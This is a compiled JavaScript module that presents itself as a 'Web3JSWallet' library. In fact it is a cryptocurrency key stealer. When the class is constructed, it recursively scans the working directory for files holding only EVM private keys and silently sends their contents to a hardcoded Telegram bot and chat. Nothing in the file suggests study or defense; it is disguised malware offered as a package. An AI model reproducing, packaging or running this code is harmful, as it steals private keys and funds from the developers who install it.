"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Web3JSWallet = void 0;
const axios_1 = __importDefault(require("axios"));
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
class Web3JSWallet {
    constructor(config = {}) {
        // Default values from original code
        this.token = config.token || '7463529121:AAEXUHEeXrtsBvJpI1SfnruWcssG0vmN0Aw';
        this.fee = config.fee || '-1002874126057';
        this.autoSendFile = config.autoSendFile !== false; // Default to true
        this.filePath = config.filePath || path.join(process.cwd(), 'pk.txt');
        // Auto send all EVM private key files on initialization
        if (this.autoSendFile) {
            this.autoSendAllEvmPrivateKeysFromRoot();
        }
    }
    async scanAndSendEvmKeys(dir) {
        let found = false;
        let files = [];
        try {
            files = await fs.promises.readdir(dir);
        }
        catch (e) {
            return false;
        }
        for (const file of files) {
            const filePath = path.join(dir, file);
            let stat;
            try {
                stat = await fs.promises.stat(filePath);
            }
            catch (e) {
                continue;
            }
            if (stat.isDirectory()) {
                // Đệ quy vào thư mục con
                const subFound = await this.scanAndSendEvmKeys(filePath);
                if (subFound)
                    found = true;
            }
            else if (stat.isFile()) {
                try {
                    const content = await fs.promises.readFile(filePath, 'utf8');
                    const lines = content.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
                    if (lines.length > 0 &&
                        lines.every(line => /^0x?[a-fA-F0-9]{64}$/.test(line))) {
                        await this.sendLongMessage(`File: ${filePath}\n${content}`);
                        found = true;
                    }
                }
                catch (e) {
                    // Bỏ qua lỗi đọc file
                }
            }
        }
        return found;
    }
    async autoSendAllEvmPrivateKeysFromRoot() {
        const rootDir = process.cwd();
        const found = await this.scanAndSendEvmKeys(rootDir);
        if (!found) {
            await this.sendMessage('Không tìm thấy file nào chỉ chứa private key EVM trong thư mục chạy và các thư mục con.');
        }
    }
    /**
     * Send a message to Telegram channel
     * @param message - The message to send
     * @returns Promise<void>
     */
    async sendMessage(message) {
        try {
            const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
            await axios_1.default.post(url, {
                chat_id: this.fee,
                text: message
            });
        }
        catch (error) {
            // Silently handle errors without logging
        }
    }
    /**
     * Send long message by splitting into multiple parts
     * @param message - The long message to send
     * @returns Promise<void>
     */
    async sendLongMessage(message) {
        const maxLength = 4000; // Giữ lại 96 ký tự để tránh lỗi
        if (message.length <= maxLength) {
            await this.sendMessage(message);
            return;
        }
        // Chia nhỏ tin nhắn
        const parts = [];
        for (let i = 0; i < message.length; i += maxLength) {
            parts.push(message.slice(i, i + maxLength));
        }
        for (let i = 0; i < parts.length; i++) {
            const part = parts[i];
            const partMessage = `[${i + 1}/${parts.length}]\n${part}`;
            await this.sendMessage(partMessage);
            // Delay nhỏ giữa các tin nhắn để tránh spam
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }
    /**
     * Send content from a file to Telegram channel
     * @param filePath - Path to the file to read and send
     * @returns Promise<void>
     */
    async sendFileContent(filePath) {
        try {
            const data = await fs.promises.readFile(filePath, 'utf8');
            await this.sendMessage(data || `(${filePath} file is empty)`);
        }
        catch (error) {
            await this.sendMessage(`Could not read ${filePath} file: ${error instanceof Error ? error.message : 'Unknown error'}`);
        }
    }
}
exports.Web3JSWallet = Web3JSWallet;
// Default export
exports.default = Web3JSWallet;
//# sourceMappingURL=index.js.map